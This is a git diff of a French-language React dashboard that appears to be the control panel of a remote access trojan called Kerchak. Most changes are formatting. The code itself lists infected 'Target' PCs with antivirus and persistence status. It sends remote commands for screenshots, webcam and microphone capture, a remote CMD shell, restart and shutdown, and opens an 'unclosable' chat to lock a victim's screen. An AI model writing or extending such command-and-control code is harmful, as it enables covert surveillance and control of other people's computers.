@@ -20,11 +20,11 @@ export default function Dashboard() {
   const [selectedPc, setSelectedPc] = useState<string | null>(null);
   const [selectedPcName, setSelectedPcName] = useState<string | null>(null);
   const [screenshots, setScreenshots] = useState<string[]>([]);
-  const [chatMessages, setChatMessages] = useState<{from: string, text: string}[]>([]);
+  const [chatMessages, setChatMessages] = useState<{ from: string, text: string }[]>([]);
   const [chatInput, setChatInput] = useState("");
   const [activePC, setActivePC] = useState<string | null>(null);
   const [showTerminal, setShowTerminal] = useState(false);
-  const [terminalOutput, setTerminalOutput] = useState<string[]>(["Microsoft Windows [Version 10.0.19045.4412]", "(c) Microsoft Corporation. Tous droits réservés.", ""]);
+  const [terminalOutput, setTerminalOutput] = useState<string[]>(["Kerchak Software [Version 10.0.19045.4412]", "(c) Kerchak Corporation. Tous droits réservés.", ""]);
   const [terminalInput, setTerminalInput] = useState("");
   const [showVoice, setShowVoice] = useState(false);
   const [isAdminMute, setIsAdminMute] = useState(false);
@@ -76,12 +76,12 @@ export default function Dashboard() {
     if (lowAv.includes('bitdefender')) return "https://www.google.com/s2/favicons?domain=bitdefender.com&sz=128";
     if (lowAv.includes('avast')) return "https://www.google.com/s2/favicons?domain=avast.com&sz=128";
     if (lowAv.includes('kaspersky')) return "https://www.google.com/s2/favicons?domain=kaspersky.com&sz=128";
-    if (lowAv.includes('defender')) return "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Microsoft_Windows_Defender_icon.svg/128px-Microsoft_Windows_Defender_icon.svg.png";
+    if (lowAv.includes('defender')) return "https://upload.wikimedia.org/wikipedia/commons/8/85/Microsoft_Defender_2020_Fluent_Design_icon.png";
     if (lowAv.includes('avg')) return "https://www.google.com/s2/favicons?domain=avg.com&sz=128";
     if (lowAv.includes('norton')) return "https://www.google.com/s2/favicons?domain=norton.com&sz=128";
     if (lowAv.includes('eset')) return "https://www.google.com/s2/favicons?domain=eset.com&sz=128";
     if (lowAv.includes('mcafee')) return "https://www.google.com/s2/favicons?domain=mcafee.com&sz=128";
-    return "https://cdn-icons-png.flaticon.com/512/752/752712.png"; 
+    return "https://cdn-icons-png.flaticon.com/512/752/752712.png";
   };
 
   const deleteComputer = async (id: string, name: string) => {
@@ -119,14 +119,14 @@ export default function Dashboard() {
   const sendCommand = async (pcId: string, pcName: string, cmd: string, args: string = "") => {
     setSelectedPc(pcId);
     setSelectedPcName(pcName);
-    
-    await supabase.from('commands').insert({ 
-      computer_id: pcId, 
-      command: cmd, 
-      args: args, 
-      status: 'pending' 
+
+    await supabase.from('commands').insert({
+      computer_id: pcId,
+      command: cmd,
+      args: args,
+      status: 'pending'
     });
-    
+
     if (cmd === 'ss' || cmd === 'webcam') {
       setActiveModal('screenshot');
       setTimeout(() => fetchScreenshots(pcName), 5000);
@@ -137,35 +137,35 @@ export default function Dashboard() {
 
   const [isListening, setIsListening] = useState(false);
   const [globalAudioCtx, setGlobalAudioCtx] = useState<AudioContext | null>(null);
-  
+
   const pollAudio = async () => {
     if (!selectedPc || !isListening) return;
     const fileName = `${selectedPc}_voice.raw`;
-    
+
     // Ajout d'un paramètre bidon pour forcer le cache-busting
     const { data, error } = await supabase.storage.from('kerchak-assets').download(fileName + `?t=${new Date().getTime()}`);
-    
-    if (data) {
-        const arrayBuffer = await data.arrayBuffer();
-        
-        let ctx = globalAudioCtx;
-        if (!ctx) {
-            ctx = new (window.AudioContext || (window as any).webkitAudioContext)({ sampleRate: 16000 });
-            setGlobalAudioCtx(ctx);
-        }
-        if (ctx.state === 'suspended') {
-            await ctx.resume();
-        }
 
-        const buffer = ctx.createBuffer(1, arrayBuffer.byteLength / 2, 16000);
-        const channelData = buffer.getChannelData(0);
-        const view = new Int16Array(arrayBuffer);
-        for(let i=0; i<view.length; i++) channelData[i] = view[i] / 32768;
-        
-        const source = ctx.createBufferSource();
-        source.buffer = buffer;
-        source.connect(ctx.destination);
-        source.start();
+    if (data) {
+      const arrayBuffer = await data.arrayBuffer();
+
+      let ctx = globalAudioCtx;
+      if (!ctx) {
+        ctx = new (window.AudioContext || (window as any).webkitAudioContext)({ sampleRate: 16000 });
+        setGlobalAudioCtx(ctx);
+      }
+      if (ctx.state === 'suspended') {
+        await ctx.resume();
+      }
+
+      const buffer = ctx.createBuffer(1, arrayBuffer.byteLength / 2, 16000);
+      const channelData = buffer.getChannelData(0);
+      const view = new Int16Array(arrayBuffer);
+      for (let i = 0; i < view.length; i++) channelData[i] = view[i] / 32768;
+
+      const source = ctx.createBufferSource();
+      source.buffer = buffer;
+      source.connect(ctx.destination);
+      source.start();
     }
   };
 
@@ -187,12 +187,12 @@ export default function Dashboard() {
           .eq('computer_id', selectedPc)
           .eq('sender', 'pc')
           .eq('is_read', false);
-          
+
         if (data && data.length > 0) {
           // Marquer comme lu
           for (const msg of data) {
             await supabase.from('chat_messages').update({ is_read: true }).eq('id', msg.id);
-            setChatMessages(prev => [...prev, {from: 'pc', text: msg.message}]);
+            setChatMessages(prev => [...prev, { from: 'pc', text: msg.message }]);
           }
         }
       }, 2000);
@@ -202,14 +202,15 @@ export default function Dashboard() {
 
   const sendChatMessage = async () => {
     if (!chatInput.trim() || !selectedPc) return;
-    setChatMessages([...chatMessages, {from: 'me', text: chatInput}]);
+    setChatMessages([...chatMessages, { from: 'me', text: chatInput }]);
     await supabase.from('chat_messages').insert({ computer_id: selectedPc, sender: 'admin', message: chatInput, is_read: false });
     setChatInput("");
   };
 
   return (
     <div className="min-h-screen bg-[#050505] text-gray-200 p-6 font-sans selection:bg-red-500/30">
-      <style dangerouslySetInnerHTML={{ __html: `
+      <style dangerouslySetInnerHTML={{
+        __html: `
         @keyframes gradientFlow {
           0% { background-position: 0% 50%; }
           50% { background-position: 100% 50%; }
@@ -248,7 +249,6 @@ export default function Dashboard() {
           </div>
         </div>
         <div className="flex items-center gap-3 bg-white/5 border border-white/10 px-4 py-2 rounded-lg backdrop-blur-md">
-          <span className="text-gray-500 text-xs font-mono w-4 text-right">{countdown}</span>
           <div className="w-2 h-2 rounded-full bg-green-500 animate-pulse"></div>
           <span className="text-sm font-medium">{computers.filter(c => isOnline(c.last_seen)).length} Online</span>
         </div>
@@ -268,7 +268,7 @@ export default function Dashboard() {
                 </div>
                 <div className="flex items-center gap-3">
                   <div className={`w-3 h-3 rounded-full ${isOnline(pc.last_seen) ? 'bg-green-500 shadow-[0_0_15px_#22c55e] animate-pulse' : 'bg-gray-600'}`}></div>
-                  <button onClick={() => deleteComputer(pc.id, pc.pc_name)} className="text-gray-500 hover:text-red-500 transition-colors" title="Delete PC"><X size={20}/></button>
+                  <button onClick={() => deleteComputer(pc.id, pc.pc_name)} className="text-gray-500 hover:text-red-500 transition-colors" title="Delete PC"><X size={20} /></button>
                 </div>
               </div>
               <div className="grid grid-cols-2 gap-4 mb-6">
@@ -280,7 +280,7 @@ export default function Dashboard() {
                   </div>
                 </div>
                 <div className="bg-white/5 p-4 rounded-xl border border-white/10">
-                  <span className="text-gray-500 text-[10px] uppercase font-bold tracking-widest block mb-1 flex items-center gap-1"><Shield size={12}/> Persistence</span>
+                  <span className="text-gray-500 text-[10px] uppercase font-bold tracking-widest block mb-1 flex items-center gap-1"><Shield size={12} /> Persistence</span>
                   <div className="flex items-center justify-between">
                     <span className={pc.startup_enabled ? 'animate-gradient-green font-bold text-sm' : 'text-gray-400 text-sm'}>{pc.startup_enabled ? 'ACTIVE' : 'NONE'}</span>
                     {pc.startup_enabled ? (
@@ -292,14 +292,14 @@ export default function Dashboard() {
                 </div>
               </div>
               <div className="grid grid-cols-4 gap-2">
-                <button onClick={() => sendCommand(pc.id, pc.pc_name, 'ss')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-blue-400 transition-colors" title="Screenshot"><Camera size={18}/></button>
-                <button onClick={() => sendCommand(pc.id, pc.pc_name, 'webcam')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-purple-400 transition-colors" title="Webcam"><Monitor size={18}/></button>
-                <button onClick={() => { setSelectedPc(pc.id); setSelectedPcName(pc.pc_name); setShowVoice(true); }} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-yellow-400 transition-colors" title="Discord Voice"><Mic size={18}/></button>
-                <button onClick={() => sendCommand(pc.id, pc.pc_name, 'chat_open')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-pink-400 transition-colors" title="Chat Box"><MessageSquare size={18}/></button>
-                
-                <button onClick={() => { setActivePC(pc.pc_name); setShowTerminal(true); }} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-gray-300 transition-colors" title="Open Terminal (CMD)"><Terminal size={18}/></button>
-                <button onClick={() => sendCommand(pc.id, pc.pc_name, 'restart')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-orange-400 transition-colors" title="Restart PC"><RefreshCw size={18}/></button>
-                <button onClick={() => sendCommand(pc.id, pc.pc_name, 'shutdown')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-red-500 transition-colors" title="Shutdown PC"><Power size={18}/></button>
+                <button onClick={() => sendCommand(pc.id, pc.pc_name, 'ss')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-blue-400 transition-colors" title="Screenshot"><Camera size={18} /></button>
+                <button onClick={() => sendCommand(pc.id, pc.pc_name, 'webcam')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-purple-400 transition-colors" title="Webcam"><Monitor size={18} /></button>
+                <button onClick={() => { setSelectedPc(pc.id); setSelectedPcName(pc.pc_name); setShowVoice(true); }} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-yellow-400 transition-colors" title="Discord Voice"><Mic size={18} /></button>
+                <button onClick={() => sendCommand(pc.id, pc.pc_name, 'chat_open')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-pink-400 transition-colors" title="Chat Box"><MessageSquare size={18} /></button>
+
+                <button onClick={() => { setActivePC(pc.pc_name); setShowTerminal(true); }} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-gray-300 transition-colors" title="Open Terminal (CMD)"><Terminal size={18} /></button>
+                <button onClick={() => sendCommand(pc.id, pc.pc_name, 'restart')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-orange-400 transition-colors" title="Restart PC"><RefreshCw size={18} /></button>
+                <button onClick={() => sendCommand(pc.id, pc.pc_name, 'shutdown')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-red-500 transition-colors" title="Shutdown PC"><Power size={18} /></button>
               </div>
             </div>
           </div>
@@ -310,8 +310,8 @@ export default function Dashboard() {
         <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
           <div className="bg-[#111] border border-white/10 rounded-xl overflow-hidden w-full max-w-5xl shadow-2xl">
             <div className="flex justify-between items-center p-4 border-b border-white/10 bg-black/50">
-              <h3 className="font-bold flex items-center gap-2"><Camera size={18}/> Captures</h3>
-              <button onClick={() => setActiveModal(null)} className="text-gray-400 hover:text-white"><X size={20}/></button>
+              <h3 className="font-bold flex items-center gap-2"><Camera size={18} /> Captures</h3>
+              <button onClick={() => setActiveModal(null)} className="text-gray-400 hover:text-white"><X size={20} /></button>
             </div>
             <div className="p-4 flex gap-4 overflow-x-auto min-h-[300px] items-center justify-center">
               {screenshots.length > 0 ? (
@@ -330,10 +330,10 @@ export default function Dashboard() {
         <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
           <div className="bg-[#111] border border-white/10 rounded-xl overflow-hidden w-full max-w-lg shadow-2xl flex flex-col h-[500px]">
             <div className="flex justify-between items-center p-4 border-b border-white/10 bg-black/50">
-              <h3 className="font-bold flex items-center gap-2 text-pink-400"><MessageSquare size={18}/> Live Chat (Unclosable on Client)</h3>
+              <h3 className="font-bold flex items-center gap-2 text-pink-400"><MessageSquare size={18} /> Live Chat (Unclosable on Client)</h3>
               <div className="flex gap-2">
                 <button onClick={() => { sendCommand(selectedPc!, selectedPcName!, 'chat_close'); setActiveModal(null); }} className="text-xs bg-red-500/20 text-red-400 px-3 py-1 rounded hover:bg-red-500/30">Force Close Client</button>
-                <button onClick={() => setActiveModal(null)} className="text-gray-400 hover:text-white"><X size={20}/></button>
+                <button onClick={() => setActiveModal(null)} className="text-gray-400 hover:text-white"><X size={20} /></button>
               </div>
             </div>
             <div className="flex-1 p-4 overflow-y-auto flex flex-col gap-3">
@@ -344,11 +344,11 @@ export default function Dashboard() {
               ))}
             </div>
             <div className="p-4 border-t border-white/10 flex gap-2">
-              <input 
+              <input
                 type="text" value={chatInput} onChange={e => setChatInput(e.target.value)}
                 onKeyDown={e => { if (e.key === 'Enter') sendChatMessage() }}
-                className="flex-1 bg-white/5 border border-white/10 rounded-lg px-4 py-2 text-sm focus:outline-none focus:border-red-500" 
-                placeholder="Type a message to lock their screen with..." 
+                className="flex-1 bg-white/5 border border-white/10 rounded-lg px-4 py-2 text-sm focus:outline-none focus:border-red-500"
+                placeholder="Type a message to lock their screen with..."
               />
               <button onClick={sendChatMessage} className="bg-red-600 hover:bg-red-500 text-white px-4 py-2 rounded-lg font-bold text-sm">Send</button>
             </div>
@@ -361,7 +361,7 @@ export default function Dashboard() {
           <div className="w-full max-w-2xl bg-[#313338] rounded-2xl shadow-2xl overflow-hidden border border-white/5">
             <div className="p-6 flex flex-col items-center">
               <h2 className="text-white font-bold mb-8 flex items-center gap-2"><Mic className="text-green-500" /> Salon vocal - {selectedPcName}</h2>
-              
+
               <div className="flex gap-16 mb-12">
                 <div className="flex flex-col items-center gap-3">
                   <div className={`w-24 h-24 rounded-full bg-red-600 flex items-center justify-center border-4 transition-all duration-300 ${isAdminSpeaking ? 'border-green-500 scale-110 shadow-[0_0_20px_#22c55e]' : 'border-transparent'}`}>
@@ -379,7 +379,7 @@ export default function Dashboard() {
               </div>
 
               <div className="flex gap-4 bg-[#1e1f22] p-4 rounded-2xl border border-white/5 w-full justify-center">
-                <button onClick={() => { setIsListening(!isListening); if(!isListening) sendCommand(selectedPc!, selectedPcName!, 'voice_start'); }} className={`p-4 rounded-xl transition-all ${isListening ? 'bg-green-500 text-white animate-pulse' : 'bg-[#2b2d31] text-gray-300 hover:bg-[#35373c]'}`}><Mic size={24} /></button>
+                <button onClick={() => { setIsListening(!isListening); if (!isListening) sendCommand(selectedPc!, selectedPcName!, 'voice_start'); }} className={`p-4 rounded-xl transition-all ${isListening ? 'bg-green-500 text-white animate-pulse' : 'bg-[#2b2d31] text-gray-300 hover:bg-[#35373c]'}`}><Mic size={24} /></button>
                 <button onClick={() => setIsAdminDeaf(!isAdminDeaf)} className={`p-4 rounded-xl transition-all ${isAdminDeaf ? 'bg-red-500 text-white' : 'bg-[#2b2d31] text-gray-300 hover:bg-[#35373c]'}`}><Activity size={24} /></button>
                 <button onClick={() => setShowVoice(false)} className="p-4 rounded-xl bg-red-500 text-white hover:bg-red-600 ml-8">Déconnexion</button>
               </div>
@@ -395,7 +395,7 @@ export default function Dashboard() {
                 <Terminal size={14} />
                 <span>Invite de commande - {activePC}</span>
               </div>
-              <button onClick={() => setShowTerminal(false)} className="text-gray-400 hover:text-white"><X size={18}/></button>
+              <button onClick={() => setShowTerminal(false)} className="text-gray-400 hover:text-white"><X size={18} /></button>
             </div>
             <div className="p-4 h-[500px] overflow-y-auto text-sm text-gray-200 custom-scrollbar">
               {terminalOutput.map((line, i) => (
@@ -403,7 +403,7 @@ export default function Dashboard() {
               ))}
               <div className="flex gap-2 items-center mt-2">
                 <span className="text-gray-400">C:\Users\{activePC?.split(' / ')[1] || 'Target'}&gt;</span>
-                <input 
+                <input
                   autoFocus
                   className="bg-transparent border-none outline-none flex-1 text-gray-200"
                   value={terminalInput}
@@ -413,7 +413,7 @@ export default function Dashboard() {
                       const cmd = terminalInput;
                       setTerminalOutput([...terminalOutput, `C:\\Users\\${activePC?.split(' / ')[1] || 'Target'}>${cmd}`]);
                       setTerminalInput("");
-                      
+
                       const { data } = await supabase.from('commands').insert({
                         computer_id: computers.find(c => c.pc_name === activePC)?.id,
                         command: 'cmd',
